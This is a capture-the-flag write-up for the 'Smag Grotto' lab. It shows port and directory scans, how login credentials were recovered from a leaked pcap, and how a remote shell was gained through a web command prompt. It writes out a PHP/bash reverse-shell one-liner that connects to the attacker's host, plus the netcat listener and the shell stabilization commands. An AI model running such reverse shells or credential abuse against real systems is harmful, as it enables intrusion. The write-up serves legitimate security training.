<h1 align="center">Smag Grotto </h1>

<p align="center">
  <img src="assets/smaggrotto.png" width="90" height="90"/>
</p>

<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️ </p>

A red team challenge. Let's see what we can learn today.

## Reconnaissance
A nmap at the beginning.

```
root@ip-10-114-100-127:~# nmap -sV -p- 10.114.177.92
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-31 09:11 UTC
Nmap scan report for ip-10-114-177-92.eu-central-1.compute.internal (10.114.177.92)
Host is up (0.00043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.65 seconds
```

2 open ports. Let's look up the webpage.

<img width="869" height="246" alt="Bildschirmfoto vom 2026-08-31 11-14-33" src="https://github.com/user-attachments/assets/876d90c9-d31c-4ed3-b665-091d669f981d" />

We can't really do much with that info, so we might try some directory enumeration next.

```
root@ip-10-114-100-127:~# gobuster dir -u http://10.114.177.92/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.177.92/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 402]
/mail                 (Status: 301) [Size: 313] [--> http://10.114.177.92/mail/]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The mail directory might have something interesting for us.

<img width="867" height="891" alt="Bildschirmfoto vom 2026-08-31 11-19-41" src="https://github.com/user-attachments/assets/7af53b39-ea5a-4634-8507-ad3e67664ea7" />

A collection of emails is displayed that reveals the state of the platform. Apparently a migration process is necessary, to a 10.10.0.0/8 network. There also is an appended pcap file that was supposed to explain how the systems are addressed. Usually it's not the best idea to upload such a file on a public webpage. Let's analyze that file. We might be able to discover important credentials.

## Analyzing PCAP
I focused on HTTP packets in hopes to observe some relevant network communication, where we can find authentication information.

<img width="977" height="611" alt="Bildschirmfoto vom 2026-08-31 11-34-09" src="https://github.com/user-attachments/assets/258f3343-89df-47ea-b7b2-6e990041cf9e" />

And I quickly found a POST request, which HTTP Stream we can follow. 

```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

We can use these credentials to log into the web application at *http://development.smag.thm/login.php*. Including the DNS in my /etc/hosts list. 

```
root@ip-10-114-100-127:~# vim /etc/hosts
root@ip-10-114-100-127:~# cat /etc/hosts
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
# Disable Burp Suite update checks (box is on EFS, cannot update; no-internet users hang otherwise)
127.0.0.1 releases.portswigger.net
127.0.0.1 portswigger-cdn.com
127.0.0.1 portswigger.net
::1 portswigger.net
127.0.0.1 telemetry.portswigger.net
::1 telemetry.portswigger.net
10.127.0.36	fs-0359e54e069ae92b0.efs.eu-central-1.amazonaws.com
127.0.1.1 ip-10-114-100-127
10.114.177.92	development.smag.thm
```

I had to include it in the bottom of the list, which confused me, as I wasn't aware that there is a difference between those lists. That said I finally was able to visit the webpage.

<img width="571" height="347" alt="grafik" src="https://github.com/user-attachments/assets/bd263723-07c4-447d-b33b-e0d1bcb6a756" />

The login.php directory is of interest to us, as we know legitimate credentials

username=helpdesk&password=cH4nG3M3_n0w

<img width="816" height="428" alt="grafik" src="https://github.com/user-attachments/assets/5b4b55e6-5c1d-4bf3-8c96-60ec9e35a4d3" />

After entering the credentials we are prompted to write a command.

<img width="816" height="428" alt="Bildschirmfoto vom 2026-08-31 12-18-40" src="https://github.com/user-attachments/assets/a066bf79-7f14-4035-98a9-cf005411eb37" />

Unfortunately the prompts are not being acknowledged. Last thing I tried was constructing a PHP reverse shell with netcat listener. That worked out.

My used prompt was:
`php -r 'exec("/bin/bash -c \"bash -i >& /dev/tcp/10.114.100.127/4444 0>&1\"");'` since the webpage directory itself was written in php too.

After sending the prompt the listener was able to react

```
root@ip-10-114-100-127:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.114.177.92 54434
bash: cannot set terminal process group (724): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smag:/var/www/development.smag.thm$ 
```

## Stabilizing the reverse shell
To stabilize the reverse shell, I ran the following command:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

After executing this, I also ran `stty raw -echo; fg` to fix terminal settings and improve usability.



